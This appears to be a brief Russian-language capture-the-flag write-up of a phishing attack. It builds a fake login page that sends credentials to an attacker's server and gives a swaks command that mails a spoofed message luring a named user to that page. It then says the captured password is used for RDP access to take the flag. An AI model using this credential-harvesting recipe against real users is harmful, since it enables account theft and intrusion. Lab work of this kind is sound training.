
Создаем простой сайт с формой входа
```
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Форма входа</title>
</head>
<body>
    <h2>Форма входа</h2>
    <form method="get" action="/login">
        <label for="username">Имя пользователя:</label><br>
        <input type="text" id="username" name="username"><br><br>

        <label for="password">Пароль:</label><br>
        <input type="password" id="password" name="password"><br><br>

        <button type="submit">Войти</button>
    </form>
</body>
</html>

```

запускаем python сервер
создаем письмо и отправляем пользователям

swaks --h-From: "Site" --from "kali@kali.com" --to maria@knight.com -tlso --header "Subject: Онлайн портал  " --body "Здравствуйте!
На сайте http://100.100.2.252" -s 10.10.0.30:587"

Получаем пароль пользователя, подключаемся по rdp и забираем флаг